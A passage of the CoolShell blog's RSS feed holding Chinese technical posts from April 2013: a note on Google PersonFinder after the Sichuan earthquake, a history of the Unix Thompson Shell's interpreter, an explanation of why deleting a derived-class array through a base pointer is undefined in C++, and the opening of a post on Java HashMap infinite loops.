<p>本次四川地震，谷歌率先发布了他人寻人网站：<a href="https://google.org/personfinder/2013-sichuan-earthquake" target="_blank">https://google.org/personfinder/2013-sichuan-earthquake</a>。接下来，国内的百度，360，搜索，一淘，CSDN，高德……都发布了自己的寻人网站，微博上，大家都在说这些企业不应该搞这么多这样的网站，这样只会造成混乱。而且大家都在呼吁大家一起运作一个网站，共享数据，共享信息。晚上，我在微博上看到了这个PFIF协议，于是写下这篇文章。</p>
<p>关于Google 的寻人的数据可以通过Google PersonFinder API 下载和上传，这里是其API页面：</p>
<p style="text-align: center;"><strong><a href="https://code.google.com/p/googlepersonfinder/wiki/DataAPI" target="_blank">http://code.google.com/p/googlepersonfinder/wiki/DataAPI</a></strong></p>
<p></p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-04-22T00:20:16+08:00</pubDate>
<guid>https://coolshell.cn/articles/9508.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Unix考古记：一个“遗失”的shell ]]></title>
<link>https://coolshell.cn/articles/9410.html</link>
<content><![CDATA[ 
<p><span style="color: #cc0000;"><strong>(感谢网友Leo投递此文)</strong></span></p>
<p>谨以此文纪念伟大的计算机科学巨匠<a href="https://en.wikipedia.org/wiki/Ken_Thompson" target="_blank">Ken Thompson</a>和<a href="https://en.wikipedia.org/wiki/Dennis_Ritchie" target="_blank">Dennis Ritchie</a>，并同时向其他所有为Unix发展做出贡献的黑客致敬。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%8E%86%E5%8F%B2%E7%9A%84%E5%B0%98%E5%9F%83" title="历史的尘埃">历史的尘埃</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%91%BD%E4%BB%A4%E7%BB%93%E6%9E%84%E5%92%8C%E8%A7%84%E8%8C%83" title="命令结构和规范">命令结构和规范</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E8%A7%A3%E9%87%8A%E5%99%A8%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0" title="解释器的原理与实现">解释器的原理与实现</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E9%A2%84%E5%A4%84%E7%90%86preprocessor" title="预处理(preprocessor)">预处理(preprocessor)</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E8%AF%8D%E6%B3%95%E6%89%AB%E6%8F%8Flexical_scanning" title="词法扫描(lexical scanning)">词法扫描(lexical scanning)</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90syntax_parser" title="语法分析(syntax parser)">语法分析(syntax parser)</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90Semantic_Analyzer" title="语义分析(Semantic Analyzer)">语义分析(Semantic Analyzer)</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4Executor" title="执行命令(Executor)">执行命令(Executor)</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#%E5%AD%B0%E4%BC%98%E5%AD%B0%E5%8A%A3" title="孰优孰劣">孰优孰劣</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#Thompson_Again_Shell" title="Thompson Again Shell?">Thompson Again Shell?</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#%E4%B8%80%E4%BA%9B%E6%84%9F%E6%83%B3" title="一些感想">一些感想</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99" title="参考资料">参考资料</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%8E%86%E5%8F%B2%E7%9A%84%E5%B0%98%E5%9F%83"></span>历史的尘埃<span class="ez-toc-section-end"></span>
</h4>
<p>Unix作为一个举世闻名的操作系统已有40余年的历史，围绕着这个古老的操作系统的发展又衍生出了一系列外围软件生态群，其中一个非常重要的组件就是shell。<strong>它是操作系统最外层的接口，负责直接面向用户交互并提供内核服务，</strong>包括命令行接口(CLI)或图形界面接口(GUI)两种形式。以CLI为例，它提供一套命令规范，是一种解释性语言，将用户输入经过解释器(interpreter)输出使其转化成真正的系统调用，实现人机交互的功能。</p>
<p>和操作系统一样，shell也经历了一个漫长的演变史。如今大部分资料讲述最古老的shell都是从1977年的<a href="https://en.wikipedia.org/wiki/Bourne_shell" target="_blank">Bourne Shell</a>说起的，它最初移植到<a href="https://en.wikipedia.org/wiki/Version_7_Unix" target="_blank">Unix V7</a>上，被追认整个shell家族成员的鼻祖，后来的种群都是从其身上分支出来的。</p>
<p><img alt="image placeholder" ></p>
<p>对于1977年之前的历史很多资料大多一笔带过或略过不提。事实上，第一个移植到Unix上的shell却不是<a href="https://en.wikipedia.org/wiki/Stephen_Richard_Bourne" target="_blank">Steve Bourne</a>写的，早在1975年5月，贝尔实验室就对外发布了第一个广泛传播的Unix版本——<a href="https://en.wikipedia.org/wiki/UNIX_V6" target="_blank">Unix V6</a>（之前开发的版本只供内部研究之用），其根目录下的/bin/sh是第一个Unix自带的shell，由Ken Thompson写的，因此也被称为<a href="https://en.wikipedia.org/wiki/Thompson_shell" target="_blank">Thompson Shell</a>。甚至，更早可以追溯到1971年的时候，Thompson Shell就作为一个独立于内核的应用程序而实现了，只不过从1975年正式问世到1977年被取代，短短两年的寿命使得它很少为大多数人所认识。</p>
<p><span id="more-9410"></span></p>
<p>关于Thompson Shell被取代的原因在后文中会给出说明，这里着重介绍一下该shell本身的一些技术细节。坦白讲，关于Thompson Shell的资料有点稀缺，但至少还能从网上找到<a href="http://minnie.tuhs.org/Archive/PDP-11/Distributions/research/Dennis_v6/" target="_blank">源代码</a>和<a href="http://minnie.tuhs.org/cgi-bin/utree.pl?file=V6/usr/man" target="_blank">在线文档</a>。Thompson Shell本身是由一个不足900行代码的解释器和一些外部命令工具组件(utilities)构成，用<a href="https://en.wikipedia.org/wiki/K%26R_C#K.26R_C" target="_blank">K&amp;R C</a>写成，下面给出各个组件的相关源码和文档链接。</p>
<ul>
<li>
<strong>解释器sh</strong>：解析各种shell命令，包括内置命令和外部命令；源码sh.c；安装路径/bin/sh；手册<a href="http://minnie.tuhs.org/cgi-bin/utree.pl?file=V6/usr/man/man1/sh.1" target="_blank">sh(1)</a>。</li>
</ul>
<ul>
<li>
<strong>内置命令</strong>手册包括<a href="http://minnie.tuhs.org/cgi-bin/utree.pl?file=V6/usr/man/man1/chdir.1" target="_blank">chdir(1)</a>，<a href="http://minnie.tuhs.org/cgi-bin/utree.pl?file=V6/usr/man/man1/login.1" target="_blank">login(1)</a>，<a href="http://minnie.tuhs.org/cgi-bin/utree.pl?file=V6/usr/man/man1/newgrp.1" target="_blank">newgrp(1)</a>，<a href="http://minnie.tuhs.org/cgi-bin/utree.pl?file=V6/usr/man/man1/shift.1" target="_blank">shift(1)</a>，<a href="http://minnie.tuhs.org/cgi-bin/utree.pl?file=V6/usr/man/man1/wait.1" target="_blank">wait(1)</a>。</li>
</ul>
<p>下面是外部命令：</p>
<ul>
<li>
<strong>exit命令</strong>：退出一个文件；源码exit.c；安装路径/bin/exit；手册<a href="http://minnie.tuhs.org/cgi-bin/utree.pl?file=V6/usr/man/man1/exit.1" target="_blank">exit(1)</a>。</li>
</ul>
<ul>
<li>
<strong>goto命令</strong>：在一个文件内跳转shell控制流程；源码goto.c；安装路径/bin/goto；手册<a href="http://minnie.tuhs.org/cgi-bin/utree.pl?file=V6/usr/man/man1/goto.1" target="_blank">goto(1)</a>。</li>
</ul>
<ul>
<li>
<strong>if命令</strong>：条件判断表达式，是test命令的前身；源码if.c；安装路径/bin/if), 手册<a href="http://minnie.tuhs.org/cgi-bin/utree.pl?file=V6/usr/man/man1/if.1" target="_blank">if(1)</a>。</li>
</ul>
<ul>
<li>
<strong>glob命令</strong>：扩展命令参数通配符；源码glob.c；安装路径/etc/glob；手册<a href="http://minnie.tuhs.org/cgi-bin/utree.pl?file=V6/usr/man/man8/glob.8" target="_blank">glob(8)</a>。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%91%BD%E4%BB%A4%E7%BB%93%E6%9E%84%E5%92%8C%E8%A7%84%E8%8C%83"></span>命令结构和规范<span class="ez-toc-section-end"></span>
</h4>
<p>尽管后来遭“埋汰”，Thompson Shell仍有着不容否认的历史地位，其最大的价值在于<strong>它奠定了shell命令语言结构和规范的基础，而且其解释器具有跨平台的可移植性，并影响到了后来包括Bourne Shell在内的各种脚本语言设计实现。</strong>下面我们就以其中5个特性重温一些大家已经耳熟能详的命令规范，你也可以通过<a href="http://minnie.tuhs.org/cgi-bin/utree.pl?file=V6/usr/man/man1/sh.1" target="_blank">sh(1)</a>手册查看原始资料。</p>
<ul>
<li>
<strong>过滤器/管道线(filter/pipeline)。</strong>这绝对是要载入Unix史册的发明，创立者是<a href="https://en.wikipedia.org/wiki/Douglas_McIlroy" target="_blank">Douglas McIlroy</a>，Thompson Shell引入并实现了这个伟大的概念——一个或多个命令组成一根过滤器的链条，由’|’或’^’符号分隔。除最后一个命令之外，每个命令的标准输出都被作为下一个命令的标准输入。这样每个命令都作为一个独立的进程来运行，并通过管道与邻近的进程相连接。圆括弧内的命令序列整体上可以替代单个命令作为过滤器实现，比如用户可以输入”(A;B)|C”。</li>
</ul>
<ul>
<li>
<strong>命令序列和后台进程。</strong>分号’;’指示多个命令序列化执行。’&amp;’符号指示该命令在后台异步执行，使得前面的管道线不必等待其终止，仅仅报告一个进程id，这样用户以后可以通过kill命令与它通信。有益于进程管理。</li>
</ul>
<ul>
<li>
<strong>I/O重定向。</strong>它利用了Unix设计上的一个重要特性——<strong>一切皆文件</strong>，用三个符号表示：”重定向输出，如果文件不存在则创建它，如果文件存在则截断它；’&gt;&gt;’追加模式重定向输出，如果文件不存在则创建它，如果文件存在则追加输出至末尾处。</li>
</ul>
<ul>
<li>
<strong>通配符扩展(globbing)。</strong>通配符的概念源自于正则表达式，使得解释器智能地处理用户不完全输入，比如记不清文件名、一次性输入多个文件等。’?’匹配任意单一字符；’*’匹配任意字符串（包括空串）；成对'[‘和’]’定义了字符集合一个类，可匹配方括号内任意成员，用’-‘两端可指定一系列连续字符匹配范围。</li>
</ul>
<ul>
<li>
<strong>参数传递。</strong>这里主要引入了位置参数和选项参数的概念：’$n’指示shell调用的第n个参数替代；还定义了两个选项参数’-t’和’-c’，前者用于交互，导致shell从标准输入中读入一行作为用户执行的系统命令，后者指示shell将附带的下一个参数作为命令执行（可正确处理换行符），是对’-t’的补充，特别是调用者已经读取了命令其中某些字符的情况下。如果不带选项参数则直接读取文件名</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E8%A7%A3%E9%87%8A%E5%99%A8%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0"></span>解释器的原理与实现<span class="ez-toc-section-end"></span>
</h4>
<p>接下来马上要进入核心部分了，为了搞懂shell解释器原理，我们要对其整个工作流程做个描述（这里给出一份带注解的sh.c源码剖析）。读过《编译原理》的同学知道，解释器的实现跟编译器差不多，只不过省略了生成目标代码这一步，直接将用户输入（shell命令）转化成输出（系统调用）。<strong>软件前端是一致的，包括预处理、词法扫描、语法分析和语义分析，最后还要附加一个进程管理。</strong>当然相较于现代编译器，Thompson Shell解释器在算法和规模上都要简单得多，不过原理上是相通的，何况年代上要比Lex &amp; Yacc还要早。麻雀虽小，五脏俱全，对于初学者来说，从Thompson Shell去入手编译原理或许不失为一种好选择。</p>
<h4>
<span class="ez-toc-section" id="%E9%A2%84%E5%A4%84%E7%90%86preprocessor"></span>预处理(preprocessor)<span class="ez-toc-section-end"></span>
</h4>
<p>同C预处理器需要事先将源代码中包含的宏和头文件展开一样，Thompson Shell首先需要处理命令中的<strong>选项参数</strong>和<strong>位置参数</strong>。选项参数有两种’-t’和’-c’，决定了shell从标准输入还是参数缓存中读取字符（见<a href="http://minnie.tuhs.org/cgi-bin/utree.pl?file=V6/usr/man/man1/sh.1" target="_blank">sh(1)</a>）。此外字符序列中还要处理<strong>反斜杠’\’</strong>，判断是转义字符还是行接续符，前者对下一个字符设置引用标识，表明做普通字符处理，后者将紧邻其后换行符过滤掉。</p>
<p>位置参数是<strong>美元符号’$’</strong>打头的，后带一个数字，如’$n’，预处理器对shell命令参数从头开始计数，返回数字n指定的参数位置。如果遇上double’$$’，则表示当前的进程标识，调用getpid()获取。</p>
<p>注意到预处理器需要一次读取多个字符，这样就会多读一个不必要的字符。对此解释器提供了一种<strong>预读(peek)</strong>方式，即每次从输入流读取一个字符时，放入一个预读缓存里（只有一个int大小的堆栈），也叫<strong>回退(push back)</strong>。此后先从预读缓存中读取，如果缓存被读完，则从输入流中读取。</p>
<h4>
<span class="ez-toc-section" id="%E8%AF%8D%E6%B3%95%E6%89%AB%E6%8F%8Flexical_scanning"></span>词法扫描(lexical scanning)<span class="ez-toc-section-end"></span>
</h4>
<p>经过预处理后的字符序列将被切割成为一系列<strong>词法记号(token)</strong>，安置在token列表中，扫描器将对以下几类字符做如下处理。</p>
<ul>
<li>
<strong>空格和tab</strong>：简单过滤。</li>
</ul>
<ul>
<li>
<strong>引号</strong>：需要成对出现，字符本身被过滤，一对引号之间所有字符都被设置引用标识，作为一个token。</li>
</ul>
<ul>
<li>
<strong>元字符</strong>：如’&amp;’，’|’等，字符本身作为一个单独token。</li>
</ul>
<ul>
<li>
<strong>其他字符</strong>：一律填充token，直到碰上以上字符分隔为止。</li>
</ul>
<p>举一个例子，当我们输入命令”(ls; cat tail) &gt;junk”，那么token列表映像将是这样的：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90syntax_parser"></span>语法分析(syntax parser)<span class="ez-toc-section-end"></span>
</h4>
<p>语法分析就是将token列表中的元素作为<strong>表达式(expression)</strong>并以节点为单位构建语法树，简单命令是一个表达式，而复合命令以及命令序列是多个表达式的组合。Thompson Shell中以简单数组作为语法树的容器，实际上这是结构体的一种变形，只不过每个成员字段大小都一样（都是sizeof int）而已。一个语法树节点最多有6个字段（大小根据类型可变），分别是</p>
<ul>
<li>
<strong>DTYP（节点类型）</strong>：每个节点都有唯一的类型，又分为四种——TCOM（简单命令）、TPAR（复合命令）、TFIL（过滤器/管道线）、TLST（命令序列）。</li>
</ul>
<ul>
<li>
<strong>DLEF（左子树节点）</strong>：相当于链表指针，根据DTYP定义有所不同。如过滤器类型左子树节点为前一个命令的输出重定向文件，右子树节点为后一个命令的输入重定向文件。</li>
</ul>
<ul>
<li>
<strong>DRIG（右子树节点）</strong>：同上。</li>
</ul>
<ul>
<li>
<strong>DFLG（节点属性）</strong>：这是个标志位(flag)，决定该节点包含命令的属性以及以什么样的状态执行。</li>
</ul>
<ul>
<li>
<strong>DSPR（子命令）</strong>：两重含义，对于简单命令，该字段为空；对于复合命令，该字段指向子语法树节点。</li>
</ul>
<ul>
<li>
<strong>DCOM（命令字符）</strong>：引用命令字符序列。</li>
</ul>
<p>语法树节点生成顺序根据token列表中每个元素的<strong>优先级(priority)</strong>而定，首先遍历整个列表，找到优先级最高的token作为根节点，再分别生成左右子树，这是一种最简单的<strong>自顶向下(top-down)</strong>解决方案。各个token优先级视DTYP字段而定</p>
<table class="aligncenter" width="367" border="1" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td valign="top" width="91">
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-04-26T22:29:56+08:00</pubDate>
<guid>https://coolshell.cn/articles/9410.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ “C++的数组不支持多态”？ ]]></title>
<link>https://coolshell.cn/articles/9543.html</link>
<content><![CDATA[ 
<p>先是在微博上看到了个<a href="https://weibo.com/1876004965/zueproucp" target="_blank">微博</a>和云风的评论，然后我回了“楼主对C的内存管理不了解”。</p>
<p><a href="https://coolshell.cn/wp-content/uploads/2013/04/weibo.jpg"><img alt="image placeholder" ></a></p>
<p>后来引发了很多人的讨论，大量的人又借机来黑C++，比如：</p>
<blockquote>
<p>//<a href="https://weibo.com/n/Baidu-ThursdayWang">@Baidu-ThursdayWang</a>:这不就c++弱爆了的地方吗，需要记忆太多东西</p>
<p>//<a href="https://weibo.com/n/%E7%BC%96%E7%A8%8B%E6%B5%AA%E5%AD%90%E5%BC%A0%E5%8F%91%E8%B4%A2">@编程浪子张发财</a>:这个跟C关系真不大。不过我得验证一下，感觉真的不应该是这样的。如果基类的析构这种情况不能 调用，就太弱了。</p>
<p>//<a href="https://weibo.com/1401324585" target="_blank">@程序元</a>：现在看来，当初由于毅力不够而没有深入纠缠c++语言特性的各种犄角旮旯的坑爹细枝末节，实是幸事。为现在还沉浸于这些诡异特性并乐此不疲的同志们感到忧伤。</p>
</blockquote>
<p>然后，也出现了一些乱七八糟的理解：</p>
<p><span id="more-9543"></span></p>
<blockquote>
<p>//<a href="https://weibo.com/n/BA5BO">@BA5BO</a>: 数组是基于拷贝的，而多态是基于指针的，派生类赋值给基类数组只是拷贝复制了一个基类新对象，当然不需要派生类析构函数</p>
<p>//<a href="https://weibo.com/n/%E7%BC%96%E7%A8%8B%E6%B5%AA%E5%AD%90%E5%BC%A0%E5%8F%91%E8%B4%A2">@编程浪子张发财</a>:我突然理解是怎么回事了，这种情况下数组中各元素都是等长结构体，类型必须一致，的确没法多态。这跟C#和java不同。后两者对于引用类型存放的是对象指针。</p>
</blockquote>
<p>等等，看来我必需要写一篇博客以正视听了。</p>
<p>因为没有看到上下文，我就猜测讨论的可能会是下面这两种情况之一：</p>
<p style="padding-left: 30px;">1) 一个Base*[]的指针数组中，存放了一堆派生类的指针，这样，你delete [] pBase; 只是把指针数组给删除了，并没有删除指针所指向的对象。这个是最基础的C的问题。你先得for这个指针数组，把数据里的对象都delete掉，然后再删除数组。很明显，这和C++没有什么关系。</p>
<p style="padding-left: 30px;">2）第二种可能是：Base *pBase = new Derived[n] 这样的情况。这种情况下，delete[] pBase 明显不会调用虚析构函数（当然，这并不一定，我后面会说） ，这就是上面云风回的微博。对此，我觉得如果是这个样子，这个程序员<strong>完全没有搞懂C语言中的指针和数组是怎么一回事</strong>，也没有搞清楚， 什么是对象，什么是对象的指针和引用，这完全就是C语言没有学好。</p>
<p>后来，在看到了 <a href="https://weibo.com/n/GeniusVczh">@GeniusVczh</a> 的原文 《<a id="viewpost1_TitleUrl" href="http://www.cppblog.com/vczh/archive/2013/04/27/199765.html">如何设计一门语言（一）——什么是坑(a)</a>》最后时，才知道了说的是第二种情况。也就是下面的这个示例（我加了虚的析构函数这样方便编译）：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">class Base
{
  public:
    virtual ~B(){ cout &lt;&lt;"B::~B()"&lt;&lt;endl; }
};

class Derived : public Base
{
  public:
    virtual ~D() { cout &lt;&lt;"D::D~()"&lt;&lt;endl; }
};

Base* pBase = new Derived[10];
delete[] pBase;</pre>
<h4>C语言补课</h4>
<p>我先不说这段C++的程序在什么情况下能正确调用派生类的析构函数，我还是先来说说C语言，这样我在后面说这段代码时你就明白了。</p>
<p>对于上面的：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">Base* pBase = new Derived[10];</code></p>
<p>这个语言和下面的有什么不同吗？</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">Derived d[10];

Base* pBase = d;</pre>
<p>一个是堆内存动态分配，一个是栈内存静态分配。只是内存的位置和类型不一样，在语法和使用上没有什么不一样的。（如果你把Base 和 Derived想成struct，把new想成malloc() ，你还觉得这和C++有什么关系吗？）</p>
<p><strong>那么，你觉得pBase这个指针是指向对象的，是对象的引用，还是指向一个数组的，是数组的引用？</strong></p>
<p>于是乎，你可以想像一下下面的场景：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int *pInt; char* pChar;

pInt = (int*)malloc(10*sizeof(int));

pChar = (char*)pInt;</pre>
<p><strong>对上面的pInt和pChar指针来说，pInt[3]和pChar[3]所指向的内容是否一样呢？当然不一样，因为int是4个字节，char是1个字节，步长不一样，所以当然不一样。</strong></p>
<p><strong>那么再回到那个把Derived[]数组的指针转成Base类型的指针pBase，那么pBase[3]是否会指向正确的Derrived[3]呢？</strong></p>
<p>我们来看个纯C语言的例程，下面有两个结构体，就像继承一样，我还别有用心地加了一个void *vptr，好像虚函数表一样：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">    struct A {
        void *vptr;
        int i;
    };

    struct B{
        void *vptr;
        int i;
        char c;
        int j;
    }b[2] ={
        {(void*)0x01, 100, 'a', -1},
        {(void*)0x02, 200, 'A', -2}
    };
</pre>
<p>注意：我用的是G++编译的，在64bits平台上编译的，其中的sizeof(void*)的值是8。</p>
<p>我们看一下栈上内存分配：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">    struct A *pa1 = (struct A*)(b);
</pre>
<p>用gdb我们可以看到下面的情况：(pa1[1]的成员的值完全乱掉了)</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="6">(gdb) p b
$7 = {{vptr = 0x1, i = 100, c = 97 'a', j = -1}, {vptr = 0x2, i = 200, c = 65 'A', j = -2}}
(gdb) p pa1[0]
$8 = {vptr = 0x1, i = 100}
(gdb) p pa1[1]
$9 = {vptr = 0x7fffffffffff, i = 2}
</pre>
<p>我们再来看一下堆上的情况：（我们动态了struct B [2]，然后转成struct A *，然后对其成员操作）</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">    struct A *pa = (struct A*)malloc(2*sizeof(struct B));
    struct B *pb = (struct B*)pa；

    pa[0].vptr = (void*) 0x01;
    pa[1].vptr = (void*) 0x02;

    pa[0].i = 100;
    pa[1].i = 200;
</pre>
<p>用gdb来查看一下变量，我们可以看到下面的情况：（pa没问题，但是pb[1]的内存乱掉了）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="8">(gdb) p pa[0]
$1 = {vptr = 0x1, i = 100}
(gdb) p pa[1]
$2 = {vptr = 0x2, i = 200}
(gdb) p pb[0]
$3 = {vptr = 0x1, i = 100, c = 0 '\000', j = 2}
(gdb) p pb[1]
$4 = {vptr = 0xc8, i = 0, c = 0 '\000', j = 0}
</pre>
<p>可见，这完全就是C语言里乱转型造成了内存的混乱，这和C++一点关系都没有。而且，C++的任何一本书都说过，父类对象和子类对象的转型会带来严重的内存问题。</p>
<p>但是，如果在64bits平台下，如果把我们的structB改一下，改成如下（把struct B中的int j给注释掉）：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">    struct A {
        void *vptr;
        int i;
    };

    struct B{
        void *vptr;
        int i;
        char c;
        //int j; &lt;---注释掉int j
    }b[2] ={
        {(void*)0x01, 100, 'a'},
        {(void*)0x02, 200, 'A'}
    };
</pre>
<p>你就会发现，上面的内存混乱的问题都没有了，因为struct A和struct B的size是一样的：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">(gdb) p sizeof(struct A)
$6 = 16
(gdb) p sizeof(struct B)
$7 = 16</pre>
<p>注：如果不注释int j，那么sizeof(struct B)的值是24。</p>
<p>这就是C语言中的内存对齐，内存对齐的原因就是为了更快的存取内存（详见《<a title="深入理解C语言" href="https://coolshell.cn/articles/5761.html" target="_blank">深入理解C语言</a>》）</p>
<p>如果内存对齐了，而且struct A中的成员的顺序在struct B中是一样的而且在最前面话，那么就没有问题。</p>
<h4>再来看C++的程序</h4>
<p>如果你看过我5年前写的《<strong><a href="http://blog.csdn.net/haoel/article/details/1948051" target="_blank">C++虚函数表解析</a></strong>》以及《<strong>C++内存对象布局 <a href="http://blog.csdn.net/haoel/article/details/3081328" target="_blank">上篇</a>、<a href="http://blog.csdn.net/haoel/article/details/3081385" target="_blank">下篇</a></strong>》，你就知道C++的标准会把虚函数表的指针放在类实例的最前面，你也就知道为什么我别有用心地在struct A和struct B前加了一个 void *vptr。C++之所以要加在最前面就是为了转型后，不会找不到虚表了。</p>
<p>好了，到这里，我们再来看C++，看下面的代码：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include
using namespace std;

class B
{
  int b;
  public:
    virtual ~B(){ cout &lt;&lt;"B::~B()"&lt;&lt;endl; }
};

class D: public B
{
  int i;
  public:
    virtual ~D() { cout &lt;&lt;"D::~D()"&lt;&lt;endl; }
};

int main(void)
{
    cout &lt;&lt; "sizeB:" &lt;&lt; sizeof(B) &lt;&lt; " sizeD:"&lt;&lt; sizeof(D) &lt;&lt;endl;
    B *pb = new D[2];

    delete [] pb;

    return 0;
}
</pre>
<p><strong>上面的代码可以正确执行，包括调用子类的虚函数！因为内存对齐了</strong>。在我的64bits的CentOS上——sizeof(B):16 ，sizeof(D):16</p>
<p><strong>但是，如果你在class D中再加一个int成员的问题，这个程序就Segmentation fault了</strong>。因为—— sizeof(B):16 ，sizeof(D):24。pb[1]的虚表找到了一个错误的内存上，内存乱掉了。</p>
<p>再注：我在Visual Studio 2010上做了一下测试，对于 struct 来说，其表现和gcc的是一样的，但对于class的代码来说，其可以“正确调用到虚函数”无论父类和子类有没有一样的size。</p>
<p>然而，在C++的标准中，下面这样的用法是undefined! 你可以看看StackOverflow上的相关问题讨论：《<a title="Why is it undefined behavior to delete[] an array of derived objects via a base pointer?" href="https://stackoverflow.com/questions/6171814/why-is-it-undefined-behavior-to-delete-an-array-of-derived-objects-via-a-base" target="_blank">Why is it undefined behavior to delete[] an array of derived objects via a base pointer?</a>》（同样，你也可以看看《More Effective C++》中的条款三）</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">Base* pBase = new Derived[10];

delete[] pBase;</pre>
<p>所以，微软C++编程译器define这个事让我非常不解，对微软的C++编译器再度失望，看似默默地把其编译对了很漂亮，实则误导了好多人把这种undefined的东西当成defined来用，还赞扬做得好，真是令人无语。<strong>（</strong><a href="https://weibo.com/2087077260/zup0V7LLM" target="_blank">就像微博上的这个贴一样</a>，说VC多么牛，还说这是OO的特性。我勒个去！<strong>）</strong></p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2013/04/hehe.png"><img alt="image placeholder" ></a></p>
<p>现在，你终于知道Base* pBase = new Derived[10];这个问题是C语言的转型的问题，你也应该知道用于数组的指针是怎么回事了吧？<strong>这是一个很奇葩的代码！请你不要像那些人一样在微博上和这里的评论里高呼并和我理论到：“微软的C++编译器支持这个事！”。</strong></p>
<p>最后，我越来越发现，<span style="color: #cc0000; font-size: 14px;"><strong>很多说C++难用的人，其实是不懂C语言</strong></span>。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-04-29T16:17:40+08:00</pubDate>
<guid>https://coolshell.cn/articles/9543.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 疫苗：Java HashMap的死循环 ]]></title>
<link>https://coolshell.cn/articles/9606.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >在淘宝内网里看到同事发了贴说了一个CPU被100%的线上故障，并且这个事发生了很多次，原因是在Java语言在并发情况下使用HashMap造成Race Condition，从而导致死循环。这个事情我4、5年前也经历过，本来觉得没什么好写的，因为Java的HashMap是非线程安全的，所以在并发下必然出现问题。但是，我发现近几年，很多人都经历过这个事（在网上查“HashMap Infinite Loop”可以看到很多人都在说这个事）所以，觉得这个是个普遍问题，需要写篇疫苗文章说一下这个事，并且给大家看看一个完美的“Race Condition”是怎么形成的。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E9%97%AE%E9%A2%98%E7%9A%84%E7%97%87%E7%8A%B6" title="问题的症状">问题的症状</a></li>
